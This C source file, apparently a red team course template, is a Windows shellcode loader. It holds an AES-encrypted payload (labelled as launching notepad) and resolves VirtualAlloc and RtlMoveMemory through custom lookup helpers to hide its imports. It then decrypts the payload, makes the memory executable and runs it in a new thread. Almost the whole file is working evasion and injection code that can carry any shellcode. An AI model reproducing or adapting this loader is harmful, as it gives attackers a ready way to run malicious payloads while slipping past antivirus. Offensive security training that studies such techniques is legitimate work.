/*

 Red Team Operator course code template
 PE binary - payload encryption with AES
 
 author: reenz0h (twitter: @SEKTOR7net)

*/

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include <psapi.h>
#include "helpers.h"

typedef LPVOID (WINAPI * VirtualAlloc_t)(LPVOID lpAddress, SIZE_T dwSize, DWORD  flAllocationType, DWORD  flProtect);
typedef VOID (WINAPI * RtlMoveMemory_t)(VOID UNALIGNED *Destination, const VOID UNALIGNED *Source, SIZE_T Length);


int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keylen) {
	HCRYPTPROV hProv;
	HCRYPTHASH hHash;
	HCRYPTKEY hKey;

	if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
			return -1;
	}
	if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
			return -1;
	}
	if (!CryptHashData(hHash, (BYTE*) key, (DWORD) keylen, 0)){
			return -1;              
	}
	if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
			return -1;
	}
	
	if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, (BYTE *) payload, (DWORD *) &payload_len)){
			return -1;
	}
	
	CryptReleaseContext(hProv, 0);
	CryptDestroyHash(hHash);
	CryptDestroyKey(hKey);
	
	return 0;
}

// 64-bit notepad
unsigned char payload[] = { 0xf7, 0xbb, 0x71, 0x51, 0xf6, 0x7f, 0x93, 0x50, 0x2a, 0x25, 0xba, 0x2d, 0x99, 0x65, 0x6e, 0xe6, 0x62, 0x56, 0xc0, 0x97, 0x84, 0xe7, 0xd0, 0xcb, 0x5b, 0xa7, 0x6c, 0x25, 0xd4, 0x6a, 0x47, 0xbf, 0x2e, 0xec, 0x6a, 0x20, 0x9a, 0xab, 0x62, 0xcf, 0x53, 0xc9, 0x37, 0xc3, 0x65, 0x32, 0xd5, 0xca, 0x82, 0xc2, 0xaf, 0x67, 0x8f, 0x5d, 0x6, 0x3f, 0x5d, 0x6e, 0xf4, 0x45, 0xfa, 0xb2, 0x76, 0xb, 0x66, 0x69, 0x10, 0x60, 0x75, 0x34, 0xa8, 0xbc, 0xae, 0xd4, 0x49, 0x22, 0xaf, 0xb9, 0xf8, 0x67, 0x68, 0xfc, 0x66, 0xf, 0x25, 0x79, 0x94, 0xd1, 0x12, 0x7c, 0x62, 0xe0, 0x5, 0x50, 0xce, 0x18, 0x4f, 0xa2, 0xc, 0xf2, 0xce, 0xf, 0x3f, 0xe, 0x30, 0xce, 0x65, 0x44, 0xbb, 0x4d, 0xce, 0x6a, 0x92, 0x38, 0xd, 0x1f, 0x2c, 0xbb, 0xb9, 0x5d, 0xa9, 0xe3, 0x49, 0x92, 0xf, 0x11, 0x20, 0x6b, 0x93, 0x52, 0xa5, 0xe2, 0xfb, 0xd2, 0xd5, 0x14, 0xe6, 0xc3, 0x3e, 0xe, 0x28, 0x54, 0x2, 0x64, 0x59, 0xd6, 0x37, 0xd3, 0x6d, 0x4b, 0x37, 0x34, 0x48, 0x3b, 0x5e, 0x69, 0xe0, 0x48, 0xb4, 0x9c, 0x3e, 0xb3, 0xef, 0x67, 0x81, 0x26, 0xac, 0xd0, 0x19, 0xff, 0x33, 0x72, 0x58, 0x3e, 0xbb, 0xd7, 0x71, 0xc7, 0xe6, 0x77, 0x39, 0x36, 0x7b, 0xd9, 0x22, 0x8d, 0x2e, 0x33, 0xc8, 0x67, 0x7, 0x49, 0xb0, 0x6d, 0xea, 0x6c, 0xcf, 0x2b, 0x6d, 0x56, 0x4b, 0x7d, 0xf3, 0xab, 0x18, 0x68, 0xcb, 0xee, 0xee, 0x34, 0x82, 0x93, 0x23, 0x3b, 0x4c, 0x1d, 0xa8, 0xde, 0x97, 0xd4, 0xd5, 0x89, 0xd2, 0x2e, 0xd5, 0x47, 0xa9, 0xc4, 0x91, 0x99, 0x4a, 0x74, 0x9d, 0x28, 0xfe, 0x6a, 0x8, 0x51, 0x7e, 0x5b, 0x21, 0xc9, 0x83, 0x0, 0x85, 0xe0, 0x81, 0x70, 0xc1, 0x1, 0xe0, 0xc8, 0x77, 0xb8, 0xed, 0xdb, 0xb5, 0x93, 0xb3, 0x8f, 0x7d, 0xb7, 0xba, 0x20, 0x1e, 0x6d, 0x37, 0x82, 0xef, 0xb3, 0x43, 0xf1, 0x70, 0xd4, 0x16, 0xed, 0xf7, 0x80, 0xda, 0xb8, 0x1b, 0x39, 0x62, 0x95, 0xce, 0xd7, 0x9a, 0x1d };
unsigned char key[] = { 0xca, 0x93, 0x8a, 0xff, 0xa6, 0x69, 0x92, 0x9c, 0x4a, 0xce, 0x9d, 0x11, 0xf5, 0x38, 0x72, 0x9f };


int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    
	void * exec_mem;
	BOOL rv;
	HANDLE th;
    DWORD oldprotect = 0;

	// resolve functions addresses
	//VirtualAlloc_t pVirtualAlloc = (VirtualAlloc_t) GetProcAddress(GetModuleHandle("KERNEL32.DLL"), "VirtualAlloc");	
	//RtlMoveMemory_t pRtlMoveMemory = (RtlMoveMemory_t) GetProcAddress(GetModuleHandle("KERNEL32.DLL"), "RtlMoveMemory");

	VirtualAlloc_t pVirtualAlloc = (VirtualAlloc_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "VirtualAlloc");
	RtlMoveMemory_t pRtlMoveMemory = (RtlMoveMemory_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "RtlMoveMemory");

	unsigned int payload_len = sizeof(payload);
	
	// Allocate memory for payload
	exec_mem = pVirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	// Decrypt payload
	AESDecrypt((char *) payload, payload_len, (char *) key, sizeof(key));
	
	// Copy payload to allocated buffer
	pRtlMoveMemory(exec_mem, payload, payload_len);
	
	// Make the buffer executable
	rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);

	// If all good, launch the payload
	if ( rv != 0 ) {
			th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
			WaitForSingleObject(th, -1);
	}

	return 0;
}